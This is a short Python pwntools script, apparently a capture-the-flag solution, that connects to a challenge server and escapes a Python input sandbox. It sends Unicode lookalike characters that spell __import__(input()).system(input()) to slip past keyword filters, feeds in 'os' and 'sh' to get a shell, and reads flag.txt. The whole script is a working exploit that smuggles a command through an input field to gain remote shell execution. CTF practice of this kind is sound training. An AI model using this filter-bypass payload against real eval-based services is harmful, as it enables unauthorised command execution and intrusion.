from pwn import *

p = remote("challs.nusgreyhats.org", 34508)

p.sendlineafter(b":", "_＿𝘪𝘮𝘱𝘰𝘳𝘵＿_(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶𝘵())\nos\nsh".encode())
p.clean()
p.sendline(b"cat flag.txt")

p.interactive()
